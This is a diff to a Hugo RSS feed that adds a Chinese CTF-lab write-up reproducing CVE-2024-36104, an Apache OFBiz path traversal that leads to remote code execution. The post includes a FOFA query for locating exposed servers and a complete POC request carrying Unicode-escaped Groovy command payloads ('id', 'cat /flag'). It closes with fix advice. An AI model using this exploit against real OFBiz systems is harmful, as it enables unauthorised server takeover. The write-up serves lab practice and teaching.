@@ -7,7 +7,131 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Slimer</copyright>
-        <lastBuildDate>Sun, 14 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 16 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>【春秋云境】CVE-2024-36104复现</title>
+        <link>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-36104%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Tue, 16 Sep 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83cve-2024-36104%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;img src="http://localhost:1313/images/74.webp" alt="Featured image of post 【春秋云境】CVE-2024-36104复现" /&gt;&lt;h1 id=&#34;靶标介绍&#34;&gt;靶标介绍：&lt;/h1&gt;
+&lt;p&gt;Apache OFBiz 目录遍历致代码执行漏洞，攻击者可构造恶意请求控制服务器。&lt;br&gt;
+该平台存在路径遍历漏洞，其成因是未对用户输入的 contextPath 参数进行充分验证。这使得未授权的攻击者能够通过精心构造的恶意请求绕过认证机制，进而访问系统中本应受保护的敏感接口，最终可能引发任意代码执行的严重后果。&lt;/p&gt;
+&lt;h1 id=&#34;漏洞影响版本&#34;&gt;漏洞影响版本&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;受影响版本​&lt;/strong&gt;​：&lt;code&gt;Apache OFBiz &amp;lt; 18.12.14&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;​&lt;strong&gt;​FOFA搜索语法​&lt;/strong&gt;​：&lt;code&gt;app=&amp;quot;Apache_OFBiz&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;危害&#34;&gt;危害&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;未授权访问&lt;/strong&gt;：攻击者无需认证，通过构造恶意请求，可绕过验证机制，访问本应受限的敏感接口，进而获取系统中敏感信息，如用户数据、商业机密等，严重威胁数据的保密性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;远程代码执行&lt;/strong&gt;：漏洞允许攻击者利用&lt;code&gt;/webtools/control/ProgramExport&lt;/code&gt;接口的编程导出功能，执行任意 Groovy 代码，从而实现远程代码执行，完全控制受影响的系统，可进行数据篡改、删除、植入恶意软件等操作，对系统的完整性和可用性造成极大破坏。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限提升&lt;/strong&gt;：攻击者可借此漏洞从低权限用户提升至高权限用户，进而执行更广泛的系统操作，对整个系统的安全构成严重威胁。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;中间人攻击风险&lt;/strong&gt;：攻击者可利用该漏洞篡改系统返回给合法用户的响应内容，实施中间人攻击，进一步获取用户敏感信息或向用户传播恶意内容。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;大规模攻击风险&lt;/strong&gt;：由于 Apache OFBiz 在电子商务领域的广泛应用，该漏洞的存在使得大量系统面临被攻击的风险，一旦被大规模利用，可能导致众多企业及用户的业务中断、数据泄露等严重后果，影响范围广泛。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;复现&#34;&gt;复现&lt;/h1&gt;
+&lt;p&gt;访问：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://39.106.48.123:31276/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916131814.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;正确路径应该加上/accounting/control/main
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916131841.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+这里显示你的ip为被加入到配置文件的相关允许配置参数中，所以显示了500，但是不影响后面操作，直接通过poc拿下。&lt;br&gt;
+可以看到一个 ERROR MESSAGE，出现报错，因为是非本地 localhost 启动，Headers 需要包含 &lt;code&gt;Host: localhost&lt;/code&gt;，所以把 Host 改为：localhost:port&lt;/p&gt;
+&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webtools&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;control&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;forgotPassword&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProgramExport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31276&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OFBiz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Visitor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10002&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Mozilla&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;5.0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Win64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;142.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Gecko&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20100101&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Firefox&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;142.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;application&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xhtml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;application&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*/*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Language&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;zh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TW&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;en&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;US&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;en&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Encoding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gzip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;deflate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;br&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Upgrade&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Insecure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Requests&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fetch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Dest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;document&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fetch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;navigate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fetch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Site&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;none&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fetch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Priority&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Te&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;trailers&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alive&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;application&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;262&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;groovyProgram&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0074&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0068&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0072&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u006F&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0077&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0020&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u006E&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0065&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0077&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0020&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0045&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0078&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0063&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0065&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0070&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0074&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0069&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u006F&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u006E&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0028&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0027&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0069&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0064&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0027&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u002E&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0065&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0078&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0065&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0063&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0075&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0074&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0065&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0028&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0029&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u002E&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0074&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0065&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0078&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0074&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u0029&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;u003B&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到 id 为 root，说明执行成功&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916132946.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+这里执行的远程命令是&lt;code&gt;throw new Exception(&#39;cat /flag&#39;.execute().text);&lt;/code&gt;用于获取flag&lt;br&gt;
+同样的 Unicode 编码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916133133.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250916133157.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{c95e8bc5-409e-40c9-bd82-b7234b2987fe}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;修复建议&#34;&gt;修复建议&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;官方补丁​&lt;/strong&gt;​：升级至Apache OFBiz 18.12.14或更高版本&lt;/li&gt;
+&lt;li&gt;​&lt;strong&gt;​临时缓解措施​&lt;/strong&gt;​：
+&lt;ul&gt;
+&lt;li&gt;禁用&lt;code&gt;webtools&lt;/code&gt;模块的非必要接口。&lt;/li&gt;
+&lt;li&gt;配置Web应用防火墙（WAF）拦截包含&lt;code&gt;%2e&lt;/code&gt;或&lt;code&gt;;&lt;/code&gt;的恶意请求。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
